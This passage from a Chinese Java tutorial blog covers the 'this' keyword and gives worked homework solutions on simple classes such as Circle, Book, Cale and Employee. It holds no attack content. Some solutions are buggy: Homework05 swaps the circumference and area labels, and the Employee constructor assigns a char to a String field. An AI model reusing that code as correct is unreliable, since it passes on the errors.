System.out.println(“T()构造器”);<br><br>}<br>public T(String name,int age){<br>    System.out.println(“T(String name,int age)构造器”);<br>}<br>}<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>     &lt;img src=<span class="hljs-string">&quot;https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220909181442272.png&quot;</span> alt=<span class="hljs-string">&quot;image-20220909181442272&quot;</span> style=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;<br><br><span class="hljs-number">5.</span> <span class="hljs-keyword">this</span>不能在类定义的外部使用，只能在类定义的方法中使用。<br><br>```java<br><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&#123;<br>String name = <span class="hljs-string">&quot;jack&quot;</span>;<br><span class="hljs-built_in">int</span> age = <span class="hljs-number">100</span>;<br><span class="hljs-comment">//this关键字可以用来访问本类的属性</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f3</span>()</span>&#123;<br>String name = <span class="hljs-string">&quot;smith&quot;</span>;<br><span class="hljs-comment">//传统方式</span><br>System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;name=&quot;</span>+name+<span class="hljs-string">&quot; age=&quot;</span>+age); <span class="hljs-comment">//smith</span><br><span class="hljs-comment">//this访问属性</span><br>System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;name=&quot;</span>+<span class="hljs-keyword">this</span>.name+<span class="hljs-string">&quot; age=&quot;</span>+<span class="hljs-keyword">this</span>.age); <span class="hljs-comment">//jack</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-02-11%20%E4%B8%8B%E5%8D%885.42.21.png" alt="截屏2023-02-11 下午5.42.21" style="zoom:33%;" /><h3 id="小练习-1"><a href="#小练习-1" class="headerlink" title="小练习"></a>小练习</h3><blockquote><p>定义Person类，里面有name、age属性，并提供compareTo比较方法，用于判断是否和另一个人相等，提供测试类TestPerson用于测试，名字和年龄完全一样，就返回true，否则返回false</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestPerson</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;mary&quot;</span>,<span class="hljs-number">20</span>);<br><span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;smith&quot;</span>,<span class="hljs-number">20</span>);<br>System.out.println(<span class="hljs-string">&quot;p1和p2比较的结果&quot;</span>+p1.compareTo(p2));<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>String name;<br><span class="hljs-type">int</span> age;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br><span class="hljs-built_in">this</span>.name = name;<br><span class="hljs-built_in">this</span>.age = age;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareTo</span><span class="hljs-params">(Person p)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name.equals(p.name) &amp;&amp; <span class="hljs-built_in">this</span>.age == p.age;<br><span class="hljs-comment">//this.name 是 mary</span><br><span class="hljs-comment">// p.name 是smith</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="本章作业"><a href="#本章作业" class="headerlink" title="本章作业"></a>本章作业</h2><blockquote><p>1.编写类A01，定义方法max，实现求某个double数组的最大值，并返回<br>Homework01.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework01</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">A01</span> <span class="hljs-variable">a1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A01</span>();<br><span class="hljs-type">double</span>[] a = &#123;<span class="hljs-number">33.4</span>,<span class="hljs-number">22.6</span>,<span class="hljs-number">90.4</span>,<span class="hljs-number">78.9</span>,-<span class="hljs-number">12.0</span>,<span class="hljs-number">123.8</span>,<span class="hljs-number">110.5</span>&#125;;<br><span class="hljs-comment">// double[] b = null;</span><br><span class="hljs-type">Double</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> a1.max(a);<br><span class="hljs-keyword">if</span> (res != <span class="hljs-literal">null</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;数组的最大值为：&quot;</span>+res);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;输入有误&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A01</span>&#123;<br><span class="hljs-keyword">public</span> Double <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">double</span>[] arr)</span>&#123;<br><span class="hljs-keyword">if</span>(arr != <span class="hljs-literal">null</span> &amp;&amp; arr.length&gt;<span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//先判断数组是否为null，再判断是否为空数组</span><br><span class="hljs-type">double</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>]; <span class="hljs-comment">//假定第一个元素是最大值</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;arr.length;i++) &#123;<br><span class="hljs-keyword">if</span>(max &lt; arr[i])&#123;<br>max = arr[i];<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> max;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>2.编写类A02，定义方法find，实现查找某字符串数组中的元素查找，并返回索引， 如果找不到，返回－1.Homework02.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework02</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>String[] arr = &#123;<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>,<span class="hljs-string">&quot;ccc&quot;</span>&#125;;<br><span class="hljs-type">A02</span> <span class="hljs-variable">a2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A02</span>();<br><span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> a2.find(arr,<span class="hljs-string">&quot;bbb&quot;</span>);<br><span class="hljs-comment">//判断是否找到</span><br><span class="hljs-keyword">if</span>(index==-<span class="hljs-number">1</span>)&#123;<br>System.out.println(<span class="hljs-string">&quot;未找到或输入错误。&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;index为：&quot;</span>+index);<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A02</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(String[] arr,String a)</span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++)&#123;<br><span class="hljs-keyword">if</span> (arr[i].equals(a)) &#123;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>3.编写类Book，定义方法updatePrice，实现更改某本书的价格，具体：如果价格＞150，则更改为150，如果价格＞100，更改为100，否则不变 Homework03.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework03</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//测试</span><br><span class="hljs-type">Book</span> <span class="hljs-variable">book</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;笑傲江湖&quot;</span>,<span class="hljs-number">300</span>);<br>book.info();<br>book.updatePrice();<br>book.info();<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Book</span>&#123;<br>String name;<br><span class="hljs-type">double</span> price;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Book</span><span class="hljs-params">(String name,<span class="hljs-type">double</span> price)</span>&#123;<br><span class="hljs-built_in">this</span>.name = name;<br><span class="hljs-built_in">this</span>.price = price;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updatePrice</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-comment">//如果方法中，没有price局部变量，this.price等价price</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.price&gt;<span class="hljs-number">150</span>) &#123;<br><span class="hljs-built_in">this</span>.price = <span class="hljs-number">150</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.price&gt;<span class="hljs-number">100</span>)&#123;<br><span class="hljs-built_in">this</span>.price = <span class="hljs-number">100</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//显示书籍的情况</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">info</span><span class="hljs-params">()</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;书名=&quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; 价格=&quot;</span> + <span class="hljs-built_in">this</span>.price);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220912172504701.png" alt="image-20220912172504701"></p><blockquote><p>4.编写类A03，实现数组的复制功能copyArr，输入旧数组，返回一个新数组，元素和 旧数组一样 Homework04.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework04</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span>[] oldarr = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;;<br><span class="hljs-type">A03</span> <span class="hljs-variable">a3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">A03</span>();<br><span class="hljs-type">int</span>[] newarr = a3.copyArr(oldarr);<br><span class="hljs-comment">//输出新数组，验证</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;newarr.length;i++) &#123;<br>System.out.println(newarr[i]);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A03</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] copyArr(<span class="hljs-type">int</span>[] oldarr)&#123;<br><span class="hljs-type">int</span>[] newArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[oldarr.length]; <span class="hljs-comment">//创建新数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;oldarr.length;i++)&#123;<br>newArr[i] = oldarr[i];<br>&#125;<br><span class="hljs-keyword">return</span> newArr;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>5.定义一个圆类Circle，定义属性：半径，提供显示圆周长功能的方法，提供显示圆 面积的方法 Homework05.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework05</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">Circle</span> <span class="hljs-variable">circle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>(<span class="hljs-number">3</span>);<br>System.out.println(<span class="hljs-string">&quot;面积为：&quot;</span>+circle.Circumference());<br>System.out.println(<span class="hljs-string">&quot;周长为：&quot;</span>+circle.area());<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span>&#123;<br><span class="hljs-type">double</span> radius;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Circle</span><span class="hljs-params">(<span class="hljs-type">double</span> radius)</span>&#123;<br><span class="hljs-built_in">this</span>.radius = radius;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">Circumference</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> radius*<span class="hljs-number">2</span>*Math.PI;<br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">area</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//周长</span><br><span class="hljs-keyword">return</span> radius*radius*Math.PI;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>6.编程创建一个Cale计算类，在其中定义2个变量表示两个操作数，定义四个方法实现求和、差、乘、商（要求除数为0的话，要提示）并创建两个对象，分别测试<br>Homework06.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework06</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Cale</span> <span class="hljs-variable">cale</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cale</span>(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>);<br>System.out.println(<span class="hljs-string">&quot;和=&quot;</span>+cale.sum());<br>System.out.println(<span class="hljs-string">&quot;减=&quot;</span>+cale.minus());<br>System.out.println(<span class="hljs-string">&quot;乘=&quot;</span>+cale.mul());<br>System.out.println(<span class="hljs-string">&quot;除=&quot;</span>+cale.div());<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cale</span>&#123;<br><span class="hljs-type">double</span> num1;<br><span class="hljs-type">double</span> num2;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Cale</span><span class="hljs-params">(<span class="hljs-type">double</span> num1,<span class="hljs-type">double</span> num2)</span>&#123;<br><span class="hljs-built_in">this</span>.num1 = num1;<br><span class="hljs-built_in">this</span>.num2 = num2;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> num1+num2;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">minus</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> num1-num2;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">mul</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> num1*num2;<br>&#125;<br><span class="hljs-keyword">public</span> Double <span class="hljs-title function_">div</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">if</span> (num2 == <span class="hljs-number">0</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;不能为0&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> num1/num2;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>7．设计一个Dog类，有名字、颜色和年龄属性，定义输出方法show（）显示其信息。 并创建对象，进行测试、【提示 this.属性】 Homework07.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework07</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Dog</span> <span class="hljs-variable">dog1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;小黄&quot;</span>,<span class="hljs-string">&quot;黄色&quot;</span>,<span class="hljs-number">2</span>);<br>dog1.show();<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>&#123;<br>String name;<br>String color;<br><span class="hljs-type">int</span> age;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,String color,<span class="hljs-type">int</span> age)</span>&#123;<br><span class="hljs-built_in">this</span>.name = name;<br><span class="hljs-built_in">this</span>.color = color;<br><span class="hljs-built_in">this</span>.age = age;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>System.out.println(name+<span class="hljs-string">&quot;\t&quot;</span>+color+<span class="hljs-string">&quot;\t&quot;</span>+age+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>8．给定一个Java程序的代码如下所示，则编译运行后，输出结果是（）<br>public class Test { &#x2F;&#x2F;Homework08.java<br>    int count &#x3D; 9;<br>    public void count1() {<br>count&#x3D;10;<br>    System.out.println(“count1&#x3D;” + count);<br>    }<br>public void count2() {<br>    System.out.println(“count1&#x3D;” + count++);<br>    }<br>public static void main(String args[]) {<br>        new Test().count1();<br>        Test t1&#x3D; new Test();<br>        t1.count2();<br>        t1.count2();<br>    }<br>}</p></blockquote><p>答案：10,9,10.</p><p>new Test() 是匿名对象。</p><blockquote><p><strong>匿名对象，即没有名字的对象，指的是在创建一个对象时，只有创建的语句，却没有将其地址赋值给某个变量</strong></p></blockquote><p>匿名对象执行完毕后，由于没有其他引用，会被java的垃圾回收机制判断为垃圾，进行回收。</p><blockquote><p>9．定义Music类，里面有音乐名name、音乐时长times属性，并有播放play功能和返回本身属性信息的功能方法getInfo．Homework09．java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework09</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">Music</span> <span class="hljs-variable">mymusic</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Music</span>(<span class="hljs-string">&quot;最炫民族风&quot;</span>,<span class="hljs-number">300</span>);<br>mymusic.play();<br>System.out.println(mymusic.getInfo());<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Music</span>&#123;<br>String name;<br><span class="hljs-type">int</span> times;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Music</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> times)</span>&#123;<br><span class="hljs-built_in">this</span>.name = name;<br><span class="hljs-built_in">this</span>.times = times;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;音乐 &quot;</span>+name+<span class="hljs-string">&quot; 正在播放中.... 时长为&quot;</span>+times+<span class="hljs-string">&quot;秒&quot;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;音乐名：&quot;</span>+name+<span class="hljs-string">&quot; 音乐时长:&quot;</span>+times;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220913135148629.png" alt="image-20220913135148629" style="zoom:50%;" /><blockquote><p>10．试写出以下代码的运行结果（）／／ Homework10．java<br>class Demo{<br>    int i&#x3D;100;<br>    public void m () {<br>        int j&#x3D;i++;<br>        System.out.println(“i&#x3D;”+i);<br>        System.out.println(“j&#x3D;”+j);<br>        }}<br>class Test{<br>    public static void main(String[] args){<br>        Demo d1&#x3D;new Demo();<br>        Demo d2 &#x3D; d1;<br>        d2.m();<br>        System.out.println(d1.i);<br>        System.out.println(d2.i);<br>}<br>}</p></blockquote><p>101、100、101、101</p><blockquote><p>11.在测试方法中，调用method方法，代码如下，编译正确，试写出method方法的 定义形式，调用语句为：System.out.println（method（method（10.0，20.0），100）； Homework11.java</p></blockquote><p>public double method(double d1,double d2){…}</p><blockquote><ol start="12"><li>创建一个Employee类，属性有（名字，性别，年龄，职位，薪水），提供3个构造方法，可以初始化（1）（名字，性别，年龄，职位，薪水）， （2） （名字，性别，年龄）（3） （职位，薪水），要求充分复用构造器 Homework12.java</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span>&#123;<br>String name;<br>String gender;<br><span class="hljs-type">int</span> age;<br>String job;<br><span class="hljs-type">double</span> sal;<br><span class="hljs-comment">//要求可复用</span><br><span class="hljs-comment">//职位、薪水</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String job,<span class="hljs-type">double</span> sal)</span>&#123;<br><span class="hljs-built_in">this</span>.job = job;<br><span class="hljs-built_in">this</span>.sal = sal;<br>&#125;<br><span class="hljs-comment">//姓名、性别、年龄</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String name,<span class="hljs-type">char</span> gender,<span class="hljs-type">int</span> age)</span>&#123;<br><span class="hljs-built_in">this</span>.name = name;<br><span class="hljs-built_in">this</span>.gender = gender;<br><span class="hljs-type">this</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> 